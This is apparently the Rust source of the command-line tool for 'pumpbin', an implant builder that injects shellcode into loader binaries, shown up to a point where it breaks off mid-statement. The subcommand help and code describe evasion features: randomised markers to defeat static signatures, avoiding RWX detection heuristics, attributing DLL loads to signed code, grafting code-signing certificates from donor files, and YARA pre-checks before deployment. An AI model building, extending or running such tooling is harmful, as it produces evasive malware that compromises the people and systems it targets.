use anyhow::{anyhow, bail, Context, Result};
use base64::{engine::general_purpose, Engine as _};
use chrono::Local;
use clap::{CommandFactory, Parser, Subcommand};
use clap_complete::{generate, Shell};
use dirs::home_dir;
use pumpbin::plugin::Plugin;
use pumpbin::{BinaryType, Platform, PluginConfigField, ShellcodeSaveType};
use std::collections::BTreeMap;
use std::ops::Not;
use std::path::{Path, PathBuf};
use std::process::Command;

#[derive(Parser)]
#[command(author, version, about, long_about = None)]
#[command(propagate_version = true)]
struct Cli {
    /// Disable the JSON log file sink (stderr console layer stays on).
    /// Equivalent to `PUMPBIN_NO_LOG=1`.
    #[arg(long, global = true, help_heading = "Output")]
    no_log: bool,

    /// Override log level. Accepts EnvFilter syntax, e.g. `debug` or
    /// `info,extism=warn`. Takes precedence over `PUMPBIN_LOG`.
    #[arg(long, global = true, value_name = "FILTER", help_heading = "Output")]
    log_level: Option<String>,

    /// Emit machine-readable JSON on stdout instead of human-readable
    /// text. Schema: `{"schema":"pumpbin.cli/v1","ok":bool,
    /// "data":{...} (when ok),"error":{"code":"PB-Exxxx","message":"..."}
    /// (when !ok)}`. Tracing logs still go to stderr.
    #[arg(long, global = true, help_heading = "Output")]
    json: bool,

    #[command(subcommand)]
    command: Commands,
}

const CLI_JSON_SCHEMA: &str = "pumpbin.cli/v1";

#[derive(serde::Serialize)]
struct JsonEnvelope<T: serde::Serialize> {
    schema: &'static str,
    ok: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    data: Option<T>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<JsonError>,
}

#[derive(serde::Serialize)]
struct JsonError {
    code: String,
    message: String,
}

fn emit_json_ok<T: serde::Serialize>(data: T) {
    let env = JsonEnvelope::<T> {
        schema: CLI_JSON_SCHEMA,
        ok: true,
        data: Some(data),
        error: None,
    };
    if let Ok(s) = serde_json::to_string(&env) {
        println!("{s}");
    }
}

fn emit_json_err(e: &anyhow::Error) {
    let code = e
        .downcast_ref::<pumpbin::PumpBinError>()
        .map(|pb| pb.code().to_string())
        .unwrap_or_else(|| "PB-E0000".to_string());
    let env = JsonEnvelope::<()> {
        schema: CLI_JSON_SCHEMA,
        ok: false,
        data: None,
        error: Some(JsonError {
            code,
            message: e.to_string(),
        }),
    };
    if let Ok(s) = serde_json::to_string(&env) {
        println!("{s}");
    }
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum CompletionShell {
    Bash,
    Zsh,
    Fish,
    Powershell,
    Elvish,
}

impl From<CompletionShell> for Shell {
    fn from(value: CompletionShell) -> Self {
        match value {
            CompletionShell::Bash => Shell::Bash,
            CompletionShell::Zsh => Shell::Zsh,
            CompletionShell::Fish => Shell::Fish,
            CompletionShell::Powershell => Shell::PowerShell,
            CompletionShell::Elvish => Shell::Elvish,
        }
    }
}

#[derive(Subcommand)]
#[allow(clippy::large_enum_variant)]
enum Commands {
    /// Generate an implant from a plugin and shellcode
    Generate {
        /// Path to the .b1n plugin pack (or a crate directory containing
        /// a packed .b1n).
        #[arg(short, long, value_hint = clap::ValueHint::FilePath)]
        plugin: PathBuf,

        /// Shellcode file (.bin) or remote URL.
        #[arg(short, long, value_hint = clap::ValueHint::AnyPath)]
        shellcode: String,

        /// Output file path.
        #[arg(short, long, value_hint = clap::ValueHint::FilePath)]
        output: Option<PathBuf>,

        /// Post-build module to apply. Repeat to chain multiple.
        /// Plain id: `--post byte-patch`
        /// With args: `--post byte-patch:patches=4831d2:4833d2,mode=all`
        #[arg(long = "post", value_name = "ID[:K=V,K=V]")]
        post: Vec<String>,

        /// Preview what would be generated without writing anything.
        #[arg(long)]
        dry_run: bool,

        // --- Advanced ---
        /// Target platform (windows, linux, darwin). Auto-detected from
        /// the .b1n if omitted.
        #[arg(long, help_heading = "Advanced")]
        platform: Option<String>,

        /// Target binary type (exe, lib). Auto-detected from the .b1n.
        #[arg(short = 't', long = "type", help_heading = "Advanced")]
        binary_type: Option<String>,

        /// Override module config key-values (repeatable).
        #[arg(
            long = "module-config",
            alias = "plugin-config",
            value_name = "KEY=VALUE",
            help_heading = "Advanced"
        )]
        module_config: Vec<String>,
    },

    /// Generate multiple implants from a directory of shellcodes
    Batch {
        /// Path to the PumpBin plugin (.b1n)
        #[arg(short, long, value_hint = clap::ValueHint::FilePath)]
        plugin: PathBuf,

        /// Path to the directory containing shellcode (.bin) files
        #[arg(short, long, value_hint = clap::ValueHint::DirPath)]
        directory: PathBuf,

        /// Target platform (windows, linux, darwin). Auto-detected from
        /// the .b1n if omitted.
        #[arg(long)]
        platform: Option<String>,

        /// Target binary type (exe, lib). Auto-detected from the .b1n
        /// if omitted.
        #[arg(short = 't', long = "type")]
        binary_type: Option<String>,

        /// Output directory path (optional)
        #[arg(short, long, value_hint = clap::ValueHint::DirPath)]
        output_dir: Option<PathBuf>,

        /// Override module config key-values (repeatable), e.g. --module-config padding_mb=8
        #[arg(
            long = "module-config",
            alias = "plugin-config",
            value_name = "KEY=VALUE"
        )]
        module_config: Vec<String>,
    },

    /// Create a new .b1n plugin pack from template binary and module(s)
    CreateB1n {
        /// Output .b1n file path
        #[arg(short, long, value_hint = clap::ValueHint::FilePath)]
        output: PathBuf,

        /// Plugin pack name
        #[arg(long)]
        name: String,

        /// Author string
        #[arg(long, default_value = "pumpbin-cli")]
        author: String,

        /// Plugin pack version string
        #[arg(long = "plugin-version", default_value = "0.1.0")]
        plugin_version: String,

        /// Description
        #[arg(long, default_value = "Created by pumpbin-cli create-b1n")]
        desc: String,

        /// Template binary path
        #[arg(long, value_hint = clap::ValueHint::FilePath)]
        template: PathBuf,

        /// Platform (windows, linux, darwin)
        #[arg(long)]
        platform: String,

        /// Binary type (exe, lib)
        #[arg(short = 't', long = "type")]
        binary_type: String,

        /// Shellcode placeholder marker bytes.
        #[arg(long, default_value = "$$SHELLCODE$$")]
        marker: String,

        /// Size placeholder bytes (local save type).
        #[arg(long, default_value = "$$99999$$")]
        size_holder: String,

        /// Post-build module to bake into this .b1n.
        /// Accepts `--post <id>` or `--post <id>:<k=v,k=v>`.
        #[arg(long = "post", value_name = "ID[:K=V,K=V]")]
        post_modules: Vec<String>,

        // --- Advanced ---
        /// Max placeholder region size (auto-measured from template if omitted).
        #[arg(long, help_heading = "Advanced")]
        max_len: Option<u64>,

        /// Native module id to attach as the primary hook.
        /// Use `pumpbin-cli module list` to see available ids.
        #[arg(long, help_heading = "Advanced")]
        module: Option<String>,

        /// Per-post-module config: IDX:KEY=VALUE (index matches --post order).
        #[arg(long = "post-config", value_name = "IDX:KEY=VALUE", help_heading = "Advanced")]
        post_module_config: Vec<String>,

        /// Base module config key-values.
        #[arg(long = "module-config", value_name = "KEY=VALUE", help_heading = "Advanced")]
        module_config: Vec<String>,

        /// Save type (local or remote).
        #[arg(long, default_value = "local", help_heading = "Advanced")]
        save_type: String,
    },

    /// Pack a pre-built loader binary and immediately stamp shellcode
    /// into it — one command, no .b1n file needed on disk.
    ///
    /// Platform is auto-detected from the loader's magic bytes
    /// (MZ→windows, ELF→linux, Mach-O→darwin). Pass --platform to
    /// override. The --save-b1n flag persists the intermediate .b1n so
    /// you can reuse it later with `pumpbin-cli generate`.
    ///
    /// Example:
    ///   pumpbin-cli stamp loader.exe payload.bin
    ///   pumpbin-cli stamp loader.exe payload.bin --save-b1n loader.b1n
    Stamp {
        /// Compiled loader binary (PE, ELF, or Mach-O).
        /// Must contain a shellcode placeholder (default: $$SHELLCODE$$).
        /// Loaders built with `new-loader` already satisfy this.
        #[arg(value_hint = clap::ValueHint::FilePath)]
        loader: PathBuf,

        /// Raw shellcode file (.bin) to stamp into the loader.
        #[arg(value_hint = clap::ValueHint::AnyPath)]
        shellcode: String,

        /// Output path for the generated implant.
        #[arg(short, long, value_hint = clap::ValueHint::FilePath)]
        output: Option<PathBuf>,

        /// Post-build module to apply. Repeat to chain multiple.
        /// Plain id: `--post cert-graft`
        /// With args: `--post cert-graft:donor=/path/to/signed.exe,mode=fast`
        #[arg(long = "post", value_name = "ID[:K=V,K=V]")]
        post: Vec<String>,

        /// Also write the intermediate .b1n to this path for reuse
        /// with `pumpbin-cli generate`.
        #[arg(long, value_hint = clap::ValueHint::FilePath)]
        save_b1n: Option<PathBuf>,

        // --- Advanced ---
        /// Target platform (windows, linux, darwin).
        /// Auto-detected from the loader binary magic bytes.
        #[arg(long, help_heading = "Advanced")]
        platform: Option<String>,

        /// Target binary type (exe, lib).
        #[arg(short = 't', long = "type", default_value = "exe", help_heading = "Advanced")]
        binary_type: String,

        /// Shellcode placeholder marker in the loader binary.
        #[arg(long, default_value = "$$SHELLCODE$$", help_heading = "Advanced")]
        marker: String,

        /// Size-holder marker the loader reads at runtime.
        #[arg(long, default_value = "$$99999$$", help_heading = "Advanced")]
        size_holder: String,

        /// Name embedded in the ephemeral .b1n (used as output basename
        /// when --output is omitted).
        #[arg(long, default_value = "stamp", help_heading = "Advanced")]
        name: String,
    },

    /// Build a scaffolded loader crate and pack the resulting binary
    /// into a .b1n in one step. Reads `[package.metadata.pumpbin]`
    /// from `<crate-dir>/Cargo.toml` for the loader config. The
    /// modern replacement for the generated `pumpbin-pack.sh` —
    /// cross-platform (no bash), one command instead of two.
    Pack {
        /// Path to the scaffolded loader crate. Defaults to the current
        /// directory.
        #[arg(default_value = ".", value_hint = clap::ValueHint::DirPath)]
        crate_dir: PathBuf,

        /// Cargo profile to build with. Default `release` matches what
        /// `new-loader` recommends.
        #[arg(long, default_value = "release")]
        profile: String,

        /// Output .b1n path. Defaults to `<crate-dir>/<name>.b1n` where
        /// `<name>` is the metadata's `name` field.
        #[arg(short, long, value_hint = clap::ValueHint::FilePath)]
        output: Option<PathBuf>,

        /// Skip `cargo build` — assume the artifact is already on disk.
        /// Useful for repacking after a manual rebuild or when the build
        /// happens in CI.
        #[arg(long)]
        skip_build: bool,
    },

    /// Inspect a .b1n plugin pack or a compiled loader binary.
    ///
    /// For .b1n files: shows plugin name, supported platforms, embedded
    /// modules, and config schema. Use `--diff` to compare two packs.
    ///
    /// For loader binaries (PE/ELF/Mach-O): checks whether PumpBin
    /// shellcode markers are present and reports the capacity.
    ///
    /// Use `--verify` to also check authenticode and PE checksum on a
    /// generated implant.
    Inspect {
        /// Path to a .b1n plugin pack or a compiled loader/implant binary.
        binary: PathBuf,

        /// Check authenticode signature and PE checksum (for generated
        /// implants). Replaces the old `verify` command.
        #[arg(long)]
        verify: bool,

        /// One-line summary: name, supported slots, module count.
        #[arg(long)]
        brief: bool,

        /// Optional second .b1n to diff against the first.
        #[arg(long, value_hint = clap::ValueHint::FilePath)]
        diff: Option<PathBuf>,

        /// Print a short guide on embedding PumpBin markers, then exit.
        #[arg(long)]
        help_markers: bool,
    },

    /// Convert a raw shellcode file to a different representation
    /// (hex string, C array, C# byte array, Python bytes literal,
    /// base64). Pure formatting; no donut wrapping, no msfvenom
    /// shimming. Useful for embedding shellcode in source code that
    /// gets compiled outside the PumpBin implant flow.
    Convert {
        /// Path to the input shellcode file.
        #[arg(short, long, value_hint = clap::ValueHint::FilePath)]
        input: PathBuf,
        /// Output format: raw | hex | c | csharp | python | base64.
        #[arg(short, long)]
        format: String,
        /// Output file path. If omitted, writes to stdout.
        #[arg(short, long, value_hint = clap::ValueHint::FilePath)]
        output: Option<PathBuf>,
    },

    /// Build an implant from a pumpbin.toml profile file.
    ///
    /// The profile captures plugin source, target platform/binary type,
    /// shellcode source (file/url/base64/hex), module config overrides,
    /// and output path. See `pumpbin::profile` module docs for the
    /// full schema. v1.3.0 first lands the profile flow; `--json` output
    /// and SBOM emission come in follow-up chips.
    Build {
        /// Path to the pumpbin.toml profile.
        #[arg(short = 'f', long, value_hint = clap::ValueHint::FilePath)]
        profile: PathBuf,
    },

    /// List and test modules.
    ///
    /// `pumpbin-cli module list` — show all installed modules.
    /// `pumpbin-cli module test <ID>` — run a module against a sample input.
    #[command(subcommand)]
    Module(ModuleCommands),

    /// Scaffold a new PumpBin-ready loader crate. Writes a Cargo crate
    /// at <dest> with `Cargo.toml` (carrying a
    /// `[package.metadata.pumpbin]` block), `build.rs`, and
    /// `src/main.rs` pre-wired to the placeholder markers. Then run
    /// `pumpbin-cli pack <dest>` to build the crate and assemble the
    /// `.b1n` in one step.
    ///
    /// `--padding-bytes` sets the shellcode placeholder capacity
    /// (default 1 MiB; PIC loaders typically want 4 KiB - 64 KiB).
    /// `--randomize-markers` swaps the default `$$SHELLCODE$$` /
    /// `$$99999$$` ASCII markers for a unique-per-build pair so the
    /// pre-stamp template binary doesn't carry stable static
    /// signatures across operator builds.
    NewLoader {
        /// Path to write the new crate to. Must not exist.
        dest: PathBuf,

        /// Crate name. Defaults to the basename of <dest>.
        #[arg(long)]
        name: Option<String>,

        /// Target platform: linux | windows | darwin. Defaults to
        /// the current host's platform.
        #[arg(long, default_value_t = default_scaffold_platform())]
        platform: String,

        /// Shellcode placeholder capacity. PIC loaders want this
        /// tight; the 1 MiB default is sized for fat PE wrappers.
        /// Minimum 64 bytes (one cache line of slack for any
        /// shellcode the operator might stamp).
        #[arg(long, default_value_t = pumpbin::scaffold::DEFAULT_PAD_BYTES, value_name = "BYTES")]
        padding_bytes: usize,

        /// Replace the default `$$SHELLCODE$$` / `$$99999$$` markers
        /// with a unique-per-scaffold random pair (13 ASCII chars +
        /// 9-or-4 ASCII chars). Kills the cross-build static
        /// signature for any operator shipping templates.
        #[arg(long)]
        randomize_markers: bool,

        /// Use a 4-byte u32 little-endian size holder instead of the
        /// 9-byte decimal ASCII default. PumpBin's patcher writes
        /// `len.to_le_bytes()` into the slot and the loader parses
        /// it with `u32::from_le_bytes(...)`. Useful for PIC loaders
        /// that want to avoid dragging `core::fmt` for decimal
        /// parsing. Saves 5 bytes in the placeholder slot.
        #[arg(long)]
        binary_size_holder: bool,

        /// Windows-only: comma-separated DLL names to `LoadLibraryA`
        /// from main() BEFORE the shellcode runs. The DLL load event
        /// is then attributed to this loader's signed `.text` instead
        /// of the anonymous RWX shellcode region. Names without `.dll`
        /// get it auto-appended. Example: `ws2_32,kernel32`.
        #[arg(long, value_delimiter = ',', value_name = "DLL[,DLL...]")]
        pre_load_libs: Vec<String>,

        /// Windows-only: emit `VirtualAlloc(PAGE_READWRITE)` +
        /// `VirtualProtect(PAGE_EXECUTE_READ)` instead of single-step
        /// `PAGE_EXECUTE_READWRITE`. Trades RWX-in-one-region heuristic
        /// avoidance for a VirtualProtect transition event.
        #[arg(long)]
        no_rwx: bool,

        /// After scaffolding, immediately run `cargo build --release` and
        /// pack the resulting binary into a `.b1n`. Equivalent to running
        /// `pumpbin-cli pack <dest>` right after, but in one command.
        /// If the build or pack fails, the scaffold is still kept on disk.
        #[arg(long)]
        pack: bool,
    },

    /// Pre-flight YARA scan of a generated artifact. Shells out to the
    /// `yara` binary; install via your package manager (`apt install
    /// yara`, `brew install yara`, `pacman -S yara`). Exits 0 if clean,
    /// non-zero with matched rule names if any hits. Use this before
    /// deploying to a sandbox/lab to avoid round-trips for static hits.
    Check {
        /// Path to the artifact (PE, ELF, or any binary).
        artifact: std::path::PathBuf,

        /// Path to a YARA rule file or directory of rules. Directories
        /// are scanned recursively (passes `-r` to yara).
        #[arg(long, value_name = "PATH")]
        yara_rules: std::path::PathBuf,

        /// Override the path to the `yara` binary (default: search PATH).
        #[arg(long, value_name = "PATH")]
        yara_bin: Option<std::path::PathBuf>,
    },

    /// Scan a directory of PE files (.exe, .dll, .sys) and report
    /// which carry an embedded Authenticode signature (suitable as a
    /// `trustmebro` / `pe-version-info from_donor=` source) versus
    /// catalog-signed-only (the signature lives in a separate `.cat`
    /// file and cannot be grafted onto another PE).
    ListDonors {
        /// Directory to scan (non-recursive by default).
        path: std::path::PathBuf,

        /// Recurse into subdirectories.
        #[arg(short, long)]
        recursive: bool,

        /// Print only files with an embedded signature.
        #[arg(long)]
        embedded_only: bool,
    },

    /// Print shell completion script to stdout
    Completions {
        /// Target shell
        #[arg(value_enum)]
        shell: CompletionShell,

        /// Command name to generate completions for (defaults to pumpbin-cli)
        #[arg(long, default_value = "pumpbin-cli")]
        command_name: String,
    },
}

/// Subcommands for `pumpbin-cli module`.
#[derive(clap::Subcommand)]
enum ModuleCommands {
    /// List all installed modules (built-in and drop-in).
    ///
    /// Shows each module's id, source, and description.
    /// Use `--options` to also show the per-module argument schema.
    List {
        /// Show each module's argument schema (key, type, required,
        /// default, description).
        #[arg(long)]
        options: bool,

        /// Limit output to one module id.
        #[arg(long, value_name = "ID")]
        id: Option<String>,
    },

    /// Run a module against a sample input (module author dev loop).
    ///
    /// Reads the payload from `--input` (or stdin with `-`), forwards
    /// `--arg` key=value pairs as the module's args, writes the response
    /// to `--output` (or stdout with `-`).
    Test {
        /// Module id. Looks up both built-in and drop-in registries.
        id: String,

        /// Input payload path or `-` for stdin.
        #[arg(short, long)]
        input: String,

        /// Repeatable key=value args forwarded to the module.
        #[arg(short = 'a', long = "arg", value_name = "KEY=VALUE")]
        args: Vec<String>,

        /// Output path or `-` for stdout.
        #[arg(short, long, default_value = "-")]
        output: String,

        /// Dump the wire protocol frames to stderr (for debugging
        /// external/drop-in modules).
        #[arg(long)]
        debug: bool,
    },
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    // Install tracing subscriber driven by --no-log / --log-level flags
    // (overriding PUMPBIN_NO_LOG / PUMPBIN_LOG env vars). init() is
    // idempotent and never panics; failure to open the log file degrades
    // silently to console-only.
    let log_cfg = pumpbin::logging::LoggingConfig {
        no_log_file: cli.no_log || std::env::var_os("PUMPBIN_NO_LOG").is_some(),
        level_override: cli.log_level.clone(),
        log_dir_override: None,
    };
    let _ = pumpbin::logging::init(log_cfg);
    tracing::debug!("pumpbin-cli starting");

    let result = dispatch(&cli);
    // JSON error envelope: when --json is set and the dispatch errored,
    // emit a structured error to stdout so CI parsers can match on the
    // PB-Exxxx code. Then propagate the error so the process exit
    // status is still non-zero.
    if cli.json {
        if let Err(e) = &result {
            emit_json_err(e);
        }
    }
    result
}

fn dispatch(cli: &Cli) -> Result<()> {
    match &cli.command {
        Commands::Generate {
            plugin,
            shellcode,
            platform,
            binary_type,
            output,
            module_config,
            dry_run,
            post,
        } => {
            let explicit_platform = platform.as_deref().map(parse_platform).transpose()?;
            let explicit_binary_type = binary_type.as_deref().map(parse_binary_type).transpose()?;

            let plugin_path = resolve_plugin_path(plugin)?;
            let plugin_label = plugin_path
                .file_name()
                .and_then(|s| s.to_str())
                .unwrap_or("plugin");

            let plugin_buf = std::fs::read(&plugin_path)?;
            let mut plugin_obj = Plugin::decode_from_slice(&plugin_buf)?;

            let (parsed_platform, parsed_binary_type) = plugin_obj
                .bins()
                .auto_select_target(explicit_platform, explicit_binary_type)?;

            let target_label = format!(
                "{}/{}",
                match parsed_platform {
                    Platform::Windows => "win",
                    Platform::Linux => "linux",
                    Platform::Darwin => "darwin",
                },
                match parsed_binary_type {
                    BinaryType::Executable => "exe",
                    BinaryType::DynamicLibrary => "lib",
                }
            );

            eprintln!(
                "PB  {:<20}  {}  [*] loading plugin",
                plugin_label, target_label
            );

            plugin_obj.validate_for_generation(parsed_platform, parsed_binary_type)?;

            let bin = plugin_obj
                .bins()
                .get_that_binary(parsed_platform, parsed_binary_type)
                .ok_or(anyhow!(
                    "Failed to retrieve binary for platform/type combination"
                ))?;

            plugin_obj.validate_shellcode_source(shellcode)?;
            let final_shellcode_src = shellcode.clone();
            let mut runtime_config = parse_module_config(module_config)?;

            // Append CLI-supplied post-build modules to the .b1n's chain.
            // Two forms accepted:
            //   --post <id>               plain id
            //   --post <id>:<k=v,k=v>    id with comma-separated args
            for entry in post {
                if let Some((id, args)) = entry.split_once(':') {
                    plugin_obj.plugins.modules_mut().push(id.to_string());
                    runtime_config.insert(format!("post:{id}"), args.to_string());
                } else {
                    plugin_obj.plugins.modules_mut().push(entry.clone());
                }
            }
            let schema_fields = plugin_schema_fields(&plugin_obj);
            let runtime_config =
                normalize_runtime_config_for_schema(runtime_config, &schema_fields)?;

            // Resolve output path before dry-run so we can show it in the preview.
            let output_path = if let Some(out) = output {
                out.clone()
            } else {
                let ext = ext_for_output(parsed_platform, parsed_binary_type);
                let base = plugin_obj
                    .info()
                    .plugin_name()
                    .to_lowercase()
                    .replace(' ', "_");
                let candidate = PathBuf::from(format!("{base}.{ext}"));
                // Only add a timestamp if the clean name is already taken,
                // so interactive use gets a predictable filename.
                if candidate.exists() {
                    let ts = Local::now().format("%Y%m%d_%H%M%S").to_string();
                    PathBuf::from(format!("{base}_{ts}.{ext}"))
                } else {
                    candidate
                }
            };

            if *dry_run {
                println!("DRY RUN: nothing will be written\n");
                println!(
                    "  Plugin:       {} (v{})",
                    plugin_obj.info().plugin_name(),
                    plugin_obj.info().version()
                );
                println!(
                    "  Target:       {} / {}",
                    parsed_platform, parsed_binary_type
                );
                println!("  Output:       {}", output_path.display());
                let sc_size = std::fs::metadata(shellcode).map(|m| m.len()).ok();
                if let Some(sz) = sc_size {
                    println!("  Shellcode:    {shellcode} ({sz} B)");
                } else {
                    println!("  Shellcode:    {shellcode}");
                }
                let chain = plugin_obj.plugins.modules();
                if chain.is_empty() {
                    println!("  Module chain: (none)");
                } else {
                    println!("  Module chain: {}", chain.join(" → "));
                }
                for (k, v) in &runtime_config {
                    println!("  Config:       {k} = {v}");
                }
                return Ok(());
            }

            let sc_size = std::fs::metadata(shellcode).map(|m| m.len()).unwrap_or(0);
            let chain = plugin_obj.plugins.modules().to_vec();
            if chain.is_empty() {
                eprintln!(
                    "PB  {:<20}  {}  [*] injecting shellcode ({} B)",
                    plugin_label, target_label, sc_size
                );
            } else {
                eprintln!(
                    "PB  {:<20}  {}  [*] injecting shellcode ({} B) + {}",
                    plugin_label,
                    target_label,
                    sc_size,
                    chain.join(", ")
                );
            }

            let bin = plugin_obj.replace_binary(
                bin,
                final_shellcode_src,
                vec![],
                Some(&runtime_config),
            )?;

            pumpbin::utils::atomic_write(&output_path, &bin)?;
            eprintln!(
                "PB  {:<20}  {}  [+] wrote {}",
                plugin_label,
                target_label,
                output_path.display()
            );

            Ok(())
        }
        Commands::Batch {
            plugin,
            directory,
            platform,
            binary_type,
            output_dir,
            module_config,
        } => {
            tracing::info!("Starting automated Batch generation");

            let explicit_platform = platform.as_deref().map(parse_platform).transpose()?;
            let explicit_binary_type = binary_type.as_deref().map(parse_binary_type).transpose()?;

            let plugin_path = resolve_plugin_path(plugin)?;

            tracing::info!(plugin = ?plugin_path, "Loading plugin");
            let plugin_buf = std::fs::read(&plugin_path)?;
            let plugin_obj = Plugin::decode_from_slice(&plugin_buf)?;
            let runtime_config = parse_module_config(module_config)?;
            let schema_fields = plugin_schema_fields(&plugin_obj);
            let runtime_config =
                normalize_runtime_config_for_schema(runtime_config, &schema_fields)?;

            let (parsed_platform, parsed_binary_type) = plugin_obj
                .bins()
                .auto_select_target(explicit_platform, explicit_binary_type)?;
            if explicit_platform.is_none() || explicit_binary_type.is_none() {
                tracing::info!(
                    platform = %parsed_platform,
                    binary_type = %parsed_binary_type,
                    "Auto-detected target from .b1n"
                );
            }

            tracing::info!(%parsed_platform, %parsed_binary_type, "Validating plugin for target");
            plugin_obj.validate_for_generation(parsed_platform, parsed_binary_type)?;

            let save_type = if plugin_obj.replace().size_holder().is_some() {
                ShellcodeSaveType::Local
            } else {
                ShellcodeSaveType::Remote
            };

            if save_type == ShellcodeSaveType::Remote {
                return Err(anyhow!(
                    "Batch generation does not support remote shellcode URLs at this time."
                ));
            }

            let out_dir = match output_dir {
                Some(dir) => {
                    if !dir.exists() {
                        std::fs::create_dir_all(dir)?;
                    }
                    dir.clone()
                }
                None => std::env::current_dir()?,
            };

            tracing::info!(directory = ?directory, "Scanning directory for shellcode files");
            let entries = std::fs::read_dir(directory)?;

            let mut success_count = 0;
            let mut fail_count = 0;

            for entry in entries {
                let entry = entry?;
                let path = entry.path();

                if path.is_file() {
                    let is_bin =
                        path.extension().and_then(|ext| ext.to_str()).unwrap_or("") == "bin";
                    if is_bin {
                        tracing::info!(file = ?path.file_name().unwrap_or_default(), "Processing shellcode");

                        let bin = plugin_obj
                            .bins()
                            .get_that_binary(parsed_platform, parsed_binary_type)
                            .ok_or(anyhow!(
                                "Failed to retrieve binary for platform/type combination"
                            ))?;

                        let data = match std::fs::read(&path) {
                            Ok(d) => d,
                            Err(e) => {
                                tracing::warn!(file = ?path, error = %e, "Failed to read shellcode");
                                fail_count += 1;
                                continue;
                            }
                        };

                        if data.is_empty() {
                            tracing::warn!(file = ?path, "Shellcode file is empty");
                            fail_count += 1;
                            continue;
                        }
                        if data
                            .windows(b"$$SHELLCODE$$".len())
                            .any(|w| w == b"$$SHELLCODE$$")
                        {
                            tracing::warn!(file = ?path, "Shellcode file contains placeholder");
                            fail_count += 1;
                            continue;
                        }

                        let shellcode_src = path.to_string_lossy().to_string();
                        if let Err(e) = plugin_obj.validate_shellcode_source(&shellcode_src) {
                            tracing::warn!(file = ?path, error = %e, "Invalid shellcode source");
                            fail_count += 1;
                            continue;
                        }

                        let plugin_clone = plugin_obj.clone();

                        let bin = match plugin_clone.replace_binary(
                            bin,
                            shellcode_src,
                            vec![],
                            Some(&runtime_config),
                        ) {
                            Ok(b) => b,
                            Err(e) => {
                                tracing::warn!(file = ?path, error = %e, "Failed to inject shellcode");
                                fail_count += 1;
                                continue;
                            }
                        };

                        let now = Local::now();
                        let timestamp = now.format("%H%M%S").to_string();
                        let plugin_name_sanitized = plugin_clone
                            .info()
                            .plugin_name()
                            .to_lowercase()
                            .replace(' ', "_");
                        let shellcode_name = path
                            .file_stem()
                            .unwrap_or_default()
                            .to_string_lossy()
                            .to_lowercase()
                            .replace(' ', "_");
                        let ext = ext_for_output(parsed_platform, parsed_binary_type);

                        let filename = format!(
                            "{}_{}_{}.{}",
                            plugin_name_sanitized, shellcode_name, timestamp, ext
                        );
                        let output_path = out_dir.join(filename);

                        if let Err(e) = pumpbin::utils::atomic_write(&output_path, &bin) {
                            tracing::warn!(file = ?path, error = %e, "Failed to save generated binary");
                            fail_count += 1;
                            continue;
                        }

                        tracing::info!(
                            output = ?output_path.file_name().unwrap_or_default(),
                            "Saved generated implant"
                        );
                        success_count += 1;
                    }
                }
            }

            tracing::info!(
                success = success_count,
                failed = fail_count,
                "Batch generation complete"
            );

            // Exit non-zero if nothing was generated, or if any individual case
            // failed. Pre-1.1.4 batch always exited 0, so a CI pipeline that
            // pointed at the wrong dir / a dir of non-.bin files would think
            // it succeeded and ship zero implants. Exit code policy:
            //   success > 0 && fail == 0  -> 0 (all good)
            //   success > 0 && fail > 0   -> 2 (partial)
            //   success == 0              -> 1 (nothing produced)
            match (success_count, fail_count) {
                (0, _) => bail!(
                    "Batch produced zero implants (checked directory: {}). \
                     Confirm the directory contains .bin shellcode files.",
                    directory.display()
                ),
                (_, 0) => Ok(()),
                (_, _) => bail!(
                    "Batch completed with {} failure(s) out of {} total. \
                     See [!] lines above for per-file errors.",
                    fail_count,
                    success_count + fail_count
                ),
            }
        }
        Commands::CreateB1n {
            output,
            name,
            author,
            plugin_version,
            desc,
            template,
            platform,
            binary_type,
            save_type,
            marker,
            size_holder,
            max_len,
            module,
            post_modules,
            post_module_config,
            module_config,
        } => {
            let parsed_platform = parse_platform(platform)?;
            let parsed_binary_type = parse_binary_type(binary_type)?;
            let parsed_save_type = parse_save_type(save_type)?;

            let template_bytes = std::fs::read(template).with_context(|| {
                format!("failed to read template binary: {}", template.display())
            })?;

            let mut cfg = parse_module_config(module_config)?;
            for entry in post_module_config {
                let (idx, key, value) = parse_post_module_config_entry(entry)?;
                cfg.insert(format!("post_chain.{}.config.{}", idx, key), value);
            }

            // post_modules accepts both `--post id` and `--post id:k=v,k=v`
            let mut resolved_post_modules = vec![];
            for entry in post_modules {
                if let Some((id, args)) = entry.split_once(':') {
                    resolved_post_modules.push(id.to_string());
                    cfg.insert(format!("post:{id}"), args.to_string());
                } else {
                    resolved_post_modules.push(entry.clone());
                }
            }

            let data = pumpbin::pack::B1nBuilder {
                template_bytes,
                name: name.clone(),
                author: author.clone(),
                plugin_version: plugin_version.clone(),
                desc: desc.clone(),
                platform: parsed_platform,
                binary_type: parsed_binary_type,
                save_type: parsed_save_type,
                src_prefix: marker.clone(),
                size_holder: size_holder.clone(),
                max_len_override: *max_len,
                primary_module: module.clone(),
                post_modules: resolved_post_modules,
                module_config: cfg,
            }
            .assemble()
            .with_context(|| format!("template at '{}'", template.display()))?;

            pumpbin::utils::atomic_write(output, &data)
                .with_context(|| format!("failed to write output .b1n: {}", output.display()))?;

            tracing::info!(output = %output.display(), "Created .b1n plugin pack");
            Ok(())
        }
        Commands::Stamp {
            loader,
            shellcode,
            output,
            platform,
            binary_type,
            marker,
            size_holder,
            save_b1n,
            post,
            name,
        } => {
            let template_bytes = std::fs::read(loader)
                .with_context(|| format!("failed to read loader: {}", loader.display()))?;

            let loader_label = loader
                .file_name()
                .and_then(|s| s.to_str())
                .unwrap_or("loader");

            let parsed_platform = if let Some(p) = platform.as_deref() {
                parse_platform(p)?
            } else {
                detect_platform_from_binary(&template_bytes).ok_or_else(|| {
                    anyhow!(
                        "could not detect platform from '{}' (unrecognized magic bytes); \
                         pass --platform explicitly",
                        loader.display()
                    )
                })?
            };
            let parsed_binary_type = parse_binary_type(binary_type)?;

            let target_label = format!(
                "{}/{}",
                match parsed_platform {
                    Platform::Windows => "win",
                    Platform::Linux => "linux",
                    Platform::Darwin => "darwin",
                },
                match parsed_binary_type {
                    BinaryType::Executable => "exe",
                    BinaryType::DynamicLibrary => "lib",
                }
            );

            eprintln!(
                "PB  {:<20}  {}  [*] reading loader",
                loader_label, target_label
            );
            let b1n_bytes = pumpbin::pack::B1nBuilder {
                template_bytes,
                name: name.clone(),
                author: "pumpbin-cli stamp".to_string(),
